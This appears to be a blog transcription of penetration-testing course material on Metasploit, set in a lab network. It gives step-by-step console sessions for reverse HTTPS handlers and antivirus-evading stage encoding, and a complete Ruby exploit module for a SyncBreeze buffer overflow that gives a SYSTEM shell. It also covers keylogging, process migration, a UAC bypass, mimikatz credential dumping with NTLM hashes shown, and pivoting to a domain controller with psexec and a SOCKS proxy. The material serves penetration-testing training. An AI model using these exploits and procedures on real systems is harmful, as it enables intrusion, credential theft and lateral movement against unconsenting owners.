msf5 exploit(multi/handler) > set LHOST 10.11.0.4

LHOST => 10.11.0.4

msf5 exploit(multi/handler) > set LPORT 443

LPORT => 443

msf5 exploit(multi/handler) > exploit

[*] Started HTTP reverse handler on https://10.11.0.4:443

• Note that using the exploit command without parameters will block the command prompt until execution finishes.

• In most cases, it is more helpful to include the -j flag to run the module as a background job, 

• allowing us to continue other work while we wait for the connection.

• The jobs command allows us to view running background jobs.

msf5 exploit(multi/handler) > exploit -j

[*] Exploit running as background job 1.
[*] Started HTTP reverse handler on https://10.11.0.4:443

msf5 exploit(multi/handler) > jobs

Jobs
====
 Id Name Payload Payload opts
 -- ---- ------- ------------
 0 Exploit: multi/handler windows/meterpreter/reverse_https https://10.11.0.4:443

msf5 exploit(multi/handler) > jobs -i 0

Name: Generic Payload Handler, started at 2019-08-16 07:23:22 -0400

msf5 exploit(multi/handler) > kill 0

[*] Stopping the following job(s): 0
[*] Stopping job 0

msf5 exploit(multi/handler) > 


• we can display information about it using the -i flag followed bythe job ID.
 
• In addition, we can terminate a job with kill followed by the job ID.

• At this point, the multi/handler is running and listening for an HTTPS reverse payload connection.
 
• Now, we can generate a new executable containing the windows/meterpreter/reverse_https payload, execute it on our Windows target, and our handler should come to life:

msf5 exploit(multi/handler) >

[*] https://10.11.0.4:443 handling request from 10.11.0.22; Staging x86 payload (18082
[*] Meterpreter session 3 opened (10.11.0.4:443 -> 10.11.0.22:51258)

msf5 exploit(multi/handler) >

• If we monitor the network traffic of the connection as it is being established, 
  we will see that it looks like any other HTTPS connection and as such, may evade  basic detection.

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/15.jpg)
22.3.6 Client-Side Attacks

 The Metasploit Framework also offers many features that assist with client-side attacks,
 
 including various executable formats beyond those we have already explored.
  
 We can review some of these executable formats with the -l formats option of msfvenom.
 
 kali@kali:~$ msfvenom -l formats
Framework Executable Formats [--format <value>]
===============================================
 Name
 ----
 asp
 aspx
 aspx-exe
 axis2
 dll
 elf
 elf-so
 exe
...

 
 The hta-psh, vba, and vba-psh formats are designed for use in client-side attacks by creating eithera malicious HTML Application or an Office macro for use in a Word or Excel document, respectively.
 
 The MSF also contains many browser exploits. 
 
 For example, we can search for “flash” to display multiple Flash-based exploits .
 
 msf5 > search flash
...
exploit/multi/browser/adobe_flash_hacking_team_uaf 2015-07-06 great Adobe
Flash Player ByteArray Use After Free
exploit/multi/browser/adobe_flash_nellymoser_bof 2015-06-23 great Adobe
Flash Player Nellymoser Audio Decoding Buffer Overflow
exploit/multi/browser/adobe_flash_net_connection_confusion 2015-03-12 great Adobe
Flash Player NetConnection Type Confusion
exploit/multi/browser/adobe_flash_opaque_background_uaf 2015-07-06 great Adobe
Flash opaqueBackground Use After Free
exploit/multi/browser/adobe_flash_pixel_bender_bof 2014-04-28 great Adobe
Flash Player Shader Buffer Overflow
exploit/multi/browser/adobe_flash_shader_drawing_fill 2015-05-12 great Adobe
Flash Player Drawing Fill Shader Memory Corruption
exploit/multi/browser/adobe_flash_shader_job_overflow 2015-05-12 great Adobe
Flash Player ShaderJob Buffer Overflow
exploit/multi/browser/adobe_flash_uncompress_zlib_uaf 2014-04-28 great Adobe
Flash Player ByteArray UncompressViaZlibVariant Use After Free

 
 While the exploits are verified and most are stable, they are also somewhat dated due to the increasing challenges of developing browser exploits. 
 
 If we discover a target running an older operating system like Windows 7 with an unpatched browser, this type of vector may provide the opening we need .
22.3.7 Advanced Features and Transports

 which we can display with the show advanced command. Let’s investigate a few of the more interesting options.

msf5 exploit(multi/handler) > show advanced

Module advanced options (exploit/multi/handler):

Name Current Setting Required Description
---- --------------- -------- -----------
ContextInformationFile no The information file that contains
DisablePayloadHandler false no Disable the handler code for the se
EnableContextEncoding false no Use transient context when encoding
ExitOnSession true yes Return from the exploit after a ses
ListenerTimeout 0 no The maximum number of seconds to wa
VERBOSE false no Enable detailed status messages
WORKSPACE no Specify the workspace for this modu
WfsDelay 0 no Additional delay when waiting for a
Payload advanced options (windows/meterpreter/reverse_https):
Name Current Setting Required Description
---- --------------- -------- -----------
AutoLoadStdapi true yes Automatically load the Stdapi extension
AutoRunScript no A script to run automatically on session
AutoSystemInfo true yes Automatically capture system information
AutoUnhookProcess false yes Automatically load the unhook extension
...

 let’s take a look at some advanced encoding options.

 In previous examples, we chose to encode the first stage of our shellcode that we placed into the exploit. 
 
 Since the second stage ofthe Meterpreter payload is much larger and contains more potential signatures, it could potentially be flagged by various antivirus solutions, so we may opt to encode the second stage as well.
 
 We could use EnableStageEncoding together with StageEncoder to encode the second stage and possibly bypass detection.
 
  To do this, we set EnableStageEncoding to “true” and set StageEncoderto our desired encoder, in this case, “x86/shikata_ga_nai”: 
  
  msf5 exploit(multi/handler) > set EnableStageEncoding true
EnableStageEncoding => true

msf5 exploit(multi/handler) > set StageEncoder x86/shikata_ga_nai
StageEncoder => x86/shikata_ga_nai

msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 2.
[*] Started HTTPS reverse handler on https://10.11.0.4:443

msf5 exploit(multi/handler) >
[*] https://10.11.0.4:443 handling request from 10.11.0.22; Encoded stage with x86/shi
kata_ga_nai
[*] https://10.11.0.4:443 handling request from 10.11.0.22; Staging x86 payload (18085
[*] Meterpreter session 4 opened (10.11.0.4:443 -> 10.11.0.22:51270)

msf5 exploit(multi/handler) > 
  
• The AutoRunScript option is also quite helpful as it will automatically run a script when a meterpreter connection is established.
  
• This is very useful during a client-side attack since we maynot be available when a user executes our payload, meaning the session could sit idle or be lost.
  
• For example, we can configure the gather/enum_logged_on_users module to automatically enumerate logged-in users when meterpreter connects:
  
  msf5 exploit(multi/handler) > set AutoRunScript windows/gather/enum_logged_on_users
AutoRunScript => windows/gather/enum_logged_on_users


msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 3.
[*] Started HTTPS reverse handler on https://10.11.0.4:443


msf5 exploit(multi/handler) >
[*] https://10.11.0.4:443 handling request from 10.11.0.22; Staging x86 payload (18082
[*] Meterpreter session 5 opened (10.11.0.4:443 -> 10.11.0.22:51275)
[*] Session ID 5 (10.11.0.4:443 -> 10.11.0.22:51275) processing AutoRunScript 'windows
/gather/enum_logged_on_users'
[*] Running against session 5
Current Logged Users
====================
SID User
--- ----
S-1-5-21-3048852426-3234707088-723452474-1103 corp\offsec
S-1-5-21-3426091779-1881636637-1944612440-1001 CLIENT251\admin
..............
  
 we have navigated within a meterpreter session using various built-in commands.
 
 we can also temporarily exit the meterpreter shell to perform other actions inside the Metasploit Framework, without closing down the connection. 
  
  
 We can use background to return to the msfconsole prompt, where we can perform other actions within the framework. 
 
 When we are ready to return to our meterpreter session, we can list all available sessions with sessions -l and jumpback into our session with sessions -i (interact) followed by the respective Id as shown in Listing 
  
  meterpreter > background
[*] Backgrounding session 5...

msf5 exploit(multi/handler) > sessions -l
Active sessions
===============
Id Name Type Information Connection
-- ---- ---- ----------- ----------
5 meterpreter x86/windows NT AUTHORITY\SYSTEM @ WIN10-X86 10.11.0.4:4444 ->
10.11.0.22:50344 (10.11.0.22)

msf5 exploit(multi/handler) > sessions -i 5
[*] Starting interaction with 5...

meterpreter > 
  
  
• Using these commands, we can switch between available shells on different compromised hosts without closing down any of our connections.
  
• In our previous examples, we have used a pre-defined communication protocol (like TCP or HTTPS)to exploit our target, which we chose when we generated the payload.

• However, we can use Meterpreter payload transports to switch protocols after our initial compromise.

•  We can list the currently available transports for the meterpreter connection with transport list.
  
  meterpreter > transport list
Session Expiry : @ 2019-10-09 17:01:44
ID Curr URL
-- ---- ---
1 * http://10.11.0.4:4444/gFojKgv3qFbA1MHVmlpPUgxwS_f66dxGRl8ZqbZZTkyCuJFjeAaDK/

  
  
  We can also use transport add to add a new transport protocol to the current session, using -t to set the desired transport type.
  
 In the example below, we will add the reverse_tcp transport, which is equivalent to choosing the windows/meterpreter/reverse_tcp payload. 
 
 We will apply the options for the specified transport type, including the local host IP address (-l) and the local port (-p):
  
  meterpreter > transport add -t reverse_tcp -l 10.11.0.4 -p 5555
[*] Adding new transport ...
[+] Successfully added reverse_tcp transport.
meterpreter > transport list
Session Expiry : @ 2019-10-09 17:01:44
ID Curr URL
-- ---- ---
1 * http://10.11.0.4:4444/gFojKgv3qFbA1MHVmlpPUgxwS_f66dxGRl8ZqbZZTkyCuJFjeAaDK/
2 tcp://10.11.0.4:5555

  
  
 Before we can take advantage of the new transport, we must set up a listener to accept the connection. 
 
 We’ll do this by once again selecting the multi/handler module and specifying the same parameters we selected earlier.
  
 With the handler configured, we can return to the meterpreter session and run transport next to change to the newly-created transport mode.

  This will create a new session and close down the old one.
  
  meterpreter > background
[*] Backgrounding session 5...

msf5 exploit(windows/http/syncbreeze_bof) > use multi/handler

msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp

msf5 exploit(multi/handler) > set LHOST 10.11.0.4
LHOST => 10.11.0.4

msf5 exploit(multi/handler) > set LPORT 5555
LPORT => 5555

msf5 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.11.0.4:5555

msf5 exploit(multi/handler) > sessions -i 5
[*] Starting interaction with 5...

meterpreter > transport next
[*] Changing to next transport ...
[*] Sending stage (179779 bytes) to 10.11.0.22
[+] Successfully changed to the next transport, killing current session.
[*] 10.11.0.22 - Meterpreter session 5 closed. Reason: User exit

msf5 exploit(multi/handler) >
[*] Meterpreter session 6 opened (10.11.0.4:5555 -> 10.11.0.22:50357)

msf5 exploit(multi/handler) > sessions -i 6
[*] Starting interaction with 6...

meterpreter >
  
• We successfully switched transports, created a new meterpreter session, and shut down the old one
  
  
  

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/16.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/17.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/18.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/19.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/20.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/21.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/22.jpg)


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/23.jpg)

22.3.7.1 Exercises

22.3.7.1 Exercises


1.Create a staged and a non-staged Linux binary payload to use on your Kali system.

2.Setup a Netcat listener and run the non-staged payload. Does it work?


3.Setup a Netcat listener and run the staged payload. Does it work?


4.Get a Meterpreter shell on your Windows system. Practice file transfers.
 
 
5.Inject a payload into plink.exe. Test it on your Windows system.
 
6.Create an executable file running a Meterpreter payload and execute it on your  Windowssystem.
 
7.After establishing a Meterpreter connection, setup a new transport type and change to it.
22.4 Building Our Own MSF Module

22.4 Building Our Own MSF Module 706

 The Ruby language and exploit structure are clear, straight forward, and very similar to Python. 
 
 To show how this works, we will port our SyncBreeze Python exploit to the Metasploit format, using an existing exploit in theframework as a template and copying it to the established folder structure under the homedirectory of the root user.

kali@kali:~$ sudo mkdir -p /root/.msf4/modules/exploits/windows/http
kali@kali:~$ sudo cp /usr/share/metasploit-framework/modules/exploits/windows/http/dis
k_pulse_enterprise_get.rb /root/.msf4/modules/exploits/windows/http/syncbreeze.rb
kali@kali:~/.msf4/modules/exploits/windows/http$ sudo nano /root/.msf4/modules/exploit
s/windows/http/syncbreeze.rb


• To begin, we will update the header information, including the name of the module, its description,author, and external references.

'Name' => 'SyncBreeze Enterprise Buffer Overflow',
'Description' => %q(
 This module ports our python exploit of SyncBreeze Enterprise 10.0.28 to MSF.
),
'License' => MSF_LICENSE,
'Author' => [ 'Offensive Security', 'offsec' ],
'References' =>
 [
 [ 'EDB', '42886' ]
 ],

• In the next section, we will select the default options. 

• In this case, we will set EXITFUNC to “thread”and specify the bad characters we found, which are \x00\x0a\x0d\x25\x26\x2b\x3d. 

• Finally, in theTargets section, we will specify the version of SyncBreeze along with the address of the JMP ESPinstruction and the offset used to overwrite EIP.

'DefaultOptions' =>
 {
 'EXITFUNC' => 'thread'
 },
'Platform' => 'win',
'Payload' =>
 {
 'BadChars' => "\x00\x0a\x0d\x25\x26\x2b\x3d",
 'Space' => 500
 },
'Targets' =>
 [
 [ 'SyncBreeze Enterprise 10.0.28',
 {
 'Ret' => 0x10090c83, # JMP ESP -- libssp.dll
 'Offset' => 780
 }]
 ],
 

 Next, we will update the check function, which is done by performing a HTTP GET request to theURL /. 
 
 On a vulnerable system, the result contains the text “Sync Breeze Enterprise v10.0.28”.

def check
 res = send_request_cgi(
 'uri' => '/',
 'method' => 'GET'
 )
 if res && res.code == 200
 product_name = res.body.scan(/(Sync Breeze Enterprise v[^<]*)/i).flatten.first
 if product_name =~ /10\.0\.28/
 return Exploit::CheckCode::Appears
 end
 end
 return Exploit::CheckCode::Safe
end




The final section is the exploit itself.

First, we will create the exploit string, which uses the offsetand the memory address for the JMP ESP instruction along with a NOP sled and the payload.
 
Then we’ll send the crafted malicious string through an HTTP POST request using the /login URL as inthe original exploit. 
  
We will populate the HTTP POST username variable with the exploit string:

def exploit
 print_status("Generating exploit...")
 exp = rand_text_alpha(target['Offset'])
 exp << [target.ret].pack('V')
 exp << rand_text(4)
 exp << make_nops(10) # NOP sled to make sure we land on jmp to shellcode
 exp << payload.encoded
 print_status("Sending exploit...")
 send_request_cgi(
 'uri' => '/login',
 'method' => 'POST',
 'connection' => 'keep-alive',
 'vars_post' => {
 'username' => "#{exp}",
 'password' => "fakepsw"
 }
 )
 handler
 disconnect
end

Putting all the parts together gives us a complete Metasploit exploit module for the SyncBreezeEnterprise vulnerability.

##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
 Rank = ExcellentRanking
 include Msf::Exploit::Remote::HttpClient
 def initialize(info = {})
 super(update_info(info,
 'Name' => 'SyncBreeze Enterprise Buffer Overflow',
 'Description' => %q(
 This module ports our python exploit of SyncBreeze Enterprise 10.0.28 to MSF.
 ),
 'License' => MSF_LICENSE,
 'Author' => [ 'Offensive Security', 'offsec' ],
 'References' =>
 [
 [ 'EDB', '42886' ]
 ],
 'DefaultOptions' =>
 {
 'EXITFUNC' => 'thread'
 },
 'Platform' => 'win',
 'Payload' =>
 {
 'BadChars' => "\x00\x0a\x0d\x25\x26\x2b\x3d",
 'Space' => 500
 },
 'Targets' =>
 [
 [ 'SyncBreeze Enterprise 10.0.28',
 {
 'Ret' => 0x10090c83, # JMP ESP -- libssp.dll
 'Offset' => 780
 }]
 ],
 'Privileged' => true,
 'DisclosureDate' => 'Oct 20 2019',
 'DefaultTarget' => 0))
 register_options([Opt::RPORT(80)])
 end
 def check
 res = send_request_cgi(
 'uri' => '/',
 'method' => 'GET'
 )
 if res && res.code == 200
 product_name = res.body.scan(/(Sync Breeze Enterprise v[^<]*)/i).flatten.first
 if product_name =~ /10\.0\.28/
 return Exploit::CheckCode::Appears
 end
 end
 return Exploit::CheckCode::Safe
 end
 def exploit
 print_status("Generating exploit...")
 exp = rand_text_alpha(target['Offset'])
 exp << [target.ret].pack('V')
 exp << rand_text(4)
 exp << make_nops(10) # NOP sled to make sure we land on jmp to shellcode
 exp << payload.encoded
 print_status("Sending exploit...")
 send_request_cgi(
 'uri' => '/login',
 'method' => 'POST',
 'connection' => 'keep-alive',
 'vars_post' => {
 'username' => "#{exp}",
 'password' => "fakepsw"
  }
 )
 handler
 disconnect
 end
end


With the exploit complete, we can start Metasploit and search for it.

kali@kali:~$ sudo msfconsole -q
[*] Starting persistent handler(s)...
msf5 > search syncbreeze
Matching Modules
================
Name Disclosure Date Rank Check Descrip
tion
---- --------------- ---- ----- -------
----
exploit/windows/fileformat/syncbreeze_xml 2017-03-29 normal No Sync Br
eeze Enterprise 9.5.16 - Import Command Buffer Overflow
exploit/windows/http/syncbreeze/syncbreeze 2019-10-20 excellent Yes SyncBre
eze Enterprise Buffer Overflow
exploit/windows/http/syncbreeze_bof 2017-03-15 great Yes Sync Br
eeze Enterprise GET Buffer Overflow
msf5 > use exploit/windows/http/syncbreeze/syncbreeze
msf5 exploit(windows/http/syncbreeze/syncbreeze) >


We notice that the search for syncbreeze now contains three results and that the second result isour custom exploit.

Next we’ll choose a payload, set up the required parameters, and perform avulnerability check.

msf5 exploit(windows/http/syncbreeze/syncbreeze) > set PAYLOAD windows/meterpreter/rev
erse_tcp
PAYLOAD => windows/shell/reverse_tcp
msf5 exploit(windows/http/syncbreeze/syncbreeze) > set RHOSTS 10.11.0.22
RHOSTS => 10.11.0.22
msf5 exploit(windows/http/syncbreeze/syncbreeze) > set LHOST 10.11.0.4
LHOST => 10.11.0.4
msf5 exploit(windows/http/syncbreeze/syncbreeze) > check
[*] 10.11.0.22:80 - The target appears to be vulnerable
msf5 exploit(windows/http/syncbreeze/syncbreeze) > exploit
[*] Started reverse TCP handler on 10.11.0.4:4444
[*] Generating exploit...
[*] Sending exploit...
[*] Sending stage (179779 bytes) to 10.11.0.22
[*] Meterpreter session 2 opened (10.11.0.4:4444 -> 10.11.0.22:1923) at 05:19:32
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >

Excellent. It’s working perfectly. We have a shell thanks to our new Metasploit exploit module.
22.4.1.1 Exercise
22.5 Post-Exploitation with Metasploit

22.5 Post-Exploitation with Metasploit

 Once we gain access to a target machine, we can move on to the post-exploitation phase wherewe gather information, take steps to maintain our access, pivot to other machines, etc.
 
 The Metasploit Framework has several interesting post-exploitation features and modules that can simplify many aspects of the post-exploitation process.
 
 In addition to the built-in Meterpreter commands, a number of post-exploitation MSF modules have been written that take an active session as an argument.
 
 Let’s take a closer look at some of these post-exploitation features.
22.5.1 Core Post-Exploitation Features

22.5.1 Core Post-Exploitation Features

 As we have seen earlier, we can navigate the file system and list the OS and user information alongwith running processes on the compromised host.
 
 We can also both upload and download filesdirectly from the Meterpreter command prompt.
  
 Additional basic post-exploitation features are available from meterpreter, which includes theoption of taking screenshots of the compromised desktop through the screenshot command:

meterpreter > screenshot
Screenshot saved to:/root/.msf4/modules/exploits/windows/http/syncbreeze/beVjSnrB.jpeg
meterpreter > 

 An ability like this could allow us to capture pictures of sensitive user actions that might otherwisebe difficult to discover.
 
 Meterpreter also allows us to start a keylogger and detect active userkeystrokes with keyscan_start, keyscan_dump, and keyscan_stop.

meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > keyscan_dump
Dumping captured keystrokes...
ipconfig<CR>
whoami<CR>
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
meterpreter >

 Additional basic post-exploitation features include listing the idle time of the current user and turning on the microphone or webcam, which is why most security people keep their webcamscovered at all times.

 When performing actions like keylogging, it is important to take the context of the currentmeterpreter sessions into account. 
 
 When we exploited the SyncBreeze application, we obtained areverse shell running in the context of the NT SYSTEM user.
 
  In order to capture key strokes from aregular user, we will have to migrate our shell process to the user context we are targeting.
22.5.2 Migrating Processes

22.5.2 Migrating Processes

• When we compromise a host, our meterpreter payload is executed inside the process of the application we attack. 

• If the victim closes that process, our access to the machine is closed as well.

• Using the migrate command, we can move the execution of our meterpreter to different processes.

• To do this, we first run ps to view all running processes and then pick one, like explorer.exe, andissue the migrate command.

meterpreter > ps
Process List
============
PID PPID Name Arch Session User Path
--- ---- ---- ---- ------- ---- ----
...
3116 904 WmiPrvSE.exe
3164 3568 shell_reverse_msf_encoded.exe x86 1 corp\offsec C:\Users\Offsec
.corp\Desktop\shell_reverse_msf_encoded.exe
3224 808 msdtc.exe
3360 1156 sihost.exe x86 1 corp\offsec C:\Windows\Syst
em32\sihost.exe
3544 808 syncbrs.exe
3568 1960 explorer.exe x86 1 corp\offsec C:\Windows\expl
orer.exe
3820 808 svchost.exe x86 1 corp\offsec C:\Windows\Syst
em32\svchost.exe
...
meterpreter > migrate 3568

[*] Migrating from 3164 to 3568...
[*] Migration completed successfully


• Note that we are only able to migrate into a process executing at the same privilege and integrity level or lower than that of our current process. 

• In the case of Sync Breeze, since we are running a Meterpreter payload with maximum privileges (NT SYSTEM), our choices are plentiful and we can migrate our shell to different user contexts by selecting a target process accordingly.
22.5.3 Post-Exploitation Modules

22.5.3 Post-Exploitation Modules

 In addition to native commands and actions present in the core APIs of the Meterpreter, there are several post-exploitation modules we can deploy against an active session.
 
 Sessions that we recreated by execution of a client-side attack will likely provide us only with an unprivileged shell.
 
 But if the target user is a member of the local administrators group, we can elevate our shell to a high integrity level if we bypass User Account Control (UAC). 
 
 In the previous example, we migrated our meterpreter shell to an explorer.exe process that is running at medium integrity. 
 
 In the following steps, we will assume that we have gathered this shell through a client side attack.

 A search for UAC bypass modules yields quite a few results.

 However, since in our example thecompromised host is our Windows 10 Fall Creators Update client machine, we will focus on the bypassuac_injection_winsxs module as it works well on this version of Windows. 
 
 We will select the module and list its options. 
 
 This reveals a single parameter named SESSION, which is the target Meterpreter session.
 
 Setting the session to our active Meterpreter session with set SESSION 10.
 
 and running exploit will essentially pipe the exploit through the active session to the vulnerable host:

msf5 > use exploit/windows/local/bypassuac_injection_winsxs
msf5 exploit(windows/local/bypassuac_injection_winsxs) > show options
Module options (exploit/windows/local/bypassuac_injection_winsxs):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 SESSION yes The session to run this module on.
Exploit target:
 Id Name
 -- ----
 0 Windows x86
msf5 exploit(windows/local/bypassuac_injection_winsxs) > set SESSION 10
SESSION => 10
msf5 exploit(windows/local/bypassuac_injection_winsxs) > exploit
[*] Started reverse TCP handler on 10.11.0.4:4444
[+] Windows 10 (Build 16299). may be vulnerable.
[*] UAC is Enabled, checking level...
[+] Part of Administrators group! Continuing...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[*] Creating temporary folders...
[*] Uploading the Payload DLL to the filesystem...
[*] Spawning process with Windows Publisher Certificate, to inject into...
[+] Successfully injected payload in to process: 5800
[*] Sending stage (179779 bytes) to 10.11.0.22
[*] Meterpreter session 11 opened (10.11.0.4:4444 -> 10.11.0.22:53870)
meterpreter >
 
 Besides being able to background an active session and execute modules through it, we can also load extensions directly inside the active session with the load command.

 One great example of this is the PowerShell extension,717 which enables the use of PowerShell. 

 With this module, we can execute PowerShell commands and scripts, or launch an interactive PowerShell command prompt.
 
  In Listing 801, we load powershell and list the available subcommands.

meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > help powershell
Powershell Commands
===================
 Command Description
 ------- -----------
 powershell_execute Execute a Powershell command string
 powershell_import Import a PS1 script or .NET Assembly DLL
 powershell_shell Create an interactive Powershell prompt

 As an example, let’s use the powershell_execute command to retrieve the PowerShell version through the $PSVersionTable.PSVersion global variable.

meterpreter > powershell_execute "$PSVersionTable.PSVersion"
[+] Command execution completed:
Major Minor Build Revision
----- ----- ----- --------
5 1 16299 248
meterpreter >

 Mimikatz is incredibly useful as well and luckily, an implementation of it is available as a Meterpreter extension.
 
 In this example, we will run the extension with load kiwi.
 
 Since mimikatz requires SYSTEM rights, we will run getsystem to automatically acquire SYSTEM privileges from our current high integrity shell (in the context of the offsec user).
 
 Finally, we will dump the systemcredentials with creds_msv:

meterpreter > load kiwi
Loading extension kiwi...
Success.
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > creds_msv
[+] Running as SYSTEM
[*] Retrieving msv credentials
msv credentials
===============
Username Domain NTLM SHA1
DPAPI
-------- ------ ---- ----
-----
CLIENT251$ corp 4d4ae0e7cb16d4cfe6a91412b3d80ed4 5262a3692e319ca71ac2dfdb2f758e50
2adbf154
offsec corp e2b475c11da2a0748290d87aa966c327 8c77f430e4ab8acb10ead387d64011c7
6400d26e c10c264a27b63c4e66728bbef4be8aab
meterpreter > 
22.5.4 Pivoting with the Metasploit Framework

 After compromising a target, we can pivot from that system to additional targets.
 
 We can pivot from within the MSF, which is convenient, but lacks the flexibility of manual pivoting techniques.
 
 For example, let’s leverage our existing Meterpreter session to enumerate the internal network’s Active Directory infrastructure and pivot to other machines.
 
 To begin, we notice that the compromised windows client has two network interfaces


![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/24.jpg)

C:\Users\offsec>ipconfig

Windows IP Configuration

Ethernet adapter Ethernet1:
 Connection-specific DNS Suffix . :
 Link-local IPv6 Address . . . . . : fe80::49e9:5c50:265f:6600%4
 IPv4 Address. . . . . . . . . . . : 192.168.1.111
 Subnet Mask . . . . . . . . . . . : 255.255.255.0
 Default Gateway . . . . . . . . . : 192.168.1.1
Ethernet adapter Ethernet0:
 Connection-specific DNS Suffix . :
 IPv4 Address. . . . . . . . . . . : 10.11.0.22
 Subnet Mask . . . . . . . . . . . : 255.255.255.0
 Default Gateway . . . . . . . . . : 10.11.0.2
 
C:\Users\offsec.corp>


 We will use route and add to create a path to the alternate internal network subnet we discovered.
 
 We will also specify the session ID that this route will apply to:

msf5 > route add 192.168.1.0/24 11
[*] Route added

msf5 > route print
IPv4 Active Routing Table
=========================
 Subnet Netmask Gateway
 ------ ------- -------
 192.168.1.0 255.255.255.0 Session 11


 With a path created to the internal network, we can now enumerate this subnet.
 
 Since we already know the IP address of the domain controller, we will perform a limited port scan of it using the portscan/tcp module.

msf5 > use auxiliary/scanner/portscan/tcp
msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.1.110
RHOSTS => 192.168.1.110
msf5 auxiliary(scanner/portscan/tcp) > set PORTS 445,3389
PORTS => 445,3389
msf5 auxiliary(scanner/portscan/tcp) > run

[+] 192.168.1.110: - 192.168.1.110:3389 - TCP 
OPEN[+] 192.168.1.110: - 192.168.1.110:445 - TCP 
OPEN[*] 192.168.1.110: - Scanned 1 of 1 hosts (100% complete)[*]
Auxiliary module execution completed

msf5 auxiliary(scanner/portscan/tcp) >

 Since we previously discovered valid administrative credentials for the domain controller, we may now attempt a pivot to a domain controller through the use of the smb/psexec module. 
 
 We need to specify credentials by specifying values for SMBDomain, SMBUser, and SMBPass as shown below.

msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec_psh) > set SMBDomain corp
SMBDomain => corp

msf5 exploit(windows/smb/psexec_psh) > set SMBUser jeff_admin
SMBUser => jeff_admin

msf5 exploit(windows/smb/psexec_psh) > set SMBPass Qwerty09!
SMBPass => Qwerty09!

msf5 exploit(windows/smb/psexec_psh) > set RHOSTS 192.168.1.110
RHOSTS => 192.168.1.110

msf5 exploit(windows/smb/psexec_psh) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp

msf5 exploit(windows/smb/psexec_psh) > set RHOST 192.168.1.110
LHOST => 192.168.1.110

msf5 exploit(windows/smb/psexec_psh) > set LPORT 444
LPORT => 444

msf5 exploit(windows/smb/psexec_psh) > exploit

[*] 192.168.1.110:445 - Connecting to the server...
[*] 192.168.1.110:445 - Authenticating to 192.168.1.110:445|corp as user 'jeff_admin'.
..
[*] 192.168.1.110:445 - Selecting PowerShell target
[*] 192.168.1.110:445 - Executing the payload...
[+] 192.168.1.110:445 - Service start timed out, OK if running a command or non-servic
e executable...
[*] Started bind TCP handler against 192.168.1.110:444
[*] Sending stage (180291 bytes) to 192.168.1.110
[*] Meterpreter session 5 opened (10.11.0.4-10.11.0.22:0 -> 192.168.1.110:444)

meterpreter >



 It’s important to note that the added route will only work with established connections. 
 
 Because of this, the new shell on the domain controller must be a bind shell, thus allowing us to use the set route to connect to it.
 
 A reverse shell payload would not be able to find its way back to our attacking system because the domain controller does not have a route defined for our network.
 
 In this manner, we were able to obtain a meterpreter shell from the domain controller on the internal network we would otherwise not be able to reach directly.

 As an alternative to adding routes manually, we can use the autoroute post-exploitation module,which can set up pivot routes through an existing meterpreter session automatically. 
 
 Listing 808d emonstrates how the module is invoked.

msf5 exploit(multi/handler) > use multi/manage/autoroute

msf5 post(multi/manage/autoroute) > show options

Module options (post/multi/manage/autoroute):

 Name Current Setting Required Description
 ---- --------------- -------- -----------
 CMD autoadd yes Specify the autoroute command (Accepted: add, a
utoadd, print, delete, default)
 NETMASK 255.255.255.0 no Netmask (IPv4 as "255.255.255.0" or CIDR as "/2
4"
 SESSION yes The session to run this module on.
 SUBNET no Subnet (IPv4, for example, 10.10.10.0)
 
msf5 post(multi/manage/autoroute) > sessions -l

Active sessions
===============
Id Name Type Information Connectio
n
-- ---- ---- ----------- ---------
-
4 meterpreter x86/windows NT AUTHORITY\SYSTEM @ WIN10-X86 10.11.0.4:5555 ->
10.11.0.22:1883 (10.11.0.22)

msf5 post(multi/manage/autoroute) > set session 4
session => 4

msf5 post(multi/manage/autoroute) > exploit

[!] SESSION may not be compatible with this module.
[*] Running module against CLIENT251
[*] Searching for subnets to autoroute.
[+] Route added to subnet 192.168.1.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 10.11.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 169.254.0.0/255.255.0.0 from Fortinet virtual adapter.
[*] Post module execution completed

msf5 post(multi/manage/autoroute) >

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/25.jpg)

![dockerengine]({{ site.baseurl }}/post_img/oscp_origin/22/26.jpg)


 We can also combine routes with the server/socks4 a module to configure a SOCKS proxy.

 This allows applications outside the Metasploit Framework to tunnel through the pivot. 
 
 To do so, we first set the module to use the localhost for the proxy:

msf5 post(multi/manage/autoroute) > use auxiliary/server/socks4a

msf5 auxiliary(server/socks4a) > show options

Module options (auxiliary/server/socks4a):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 SRVHOST 0.0.0.0 yes The address to listen on
 SRVPORT 1080 yes The port to listen on.
Auxiliary action:
 Name Description
 ---- -----------
 Proxy
 
msf5 auxiliary(server/socks4a) > set SRVHOST 127.0.0.1
SRVHOST => 127.0.0.1

msf5 auxiliary(server/socks4a) > exploit -j

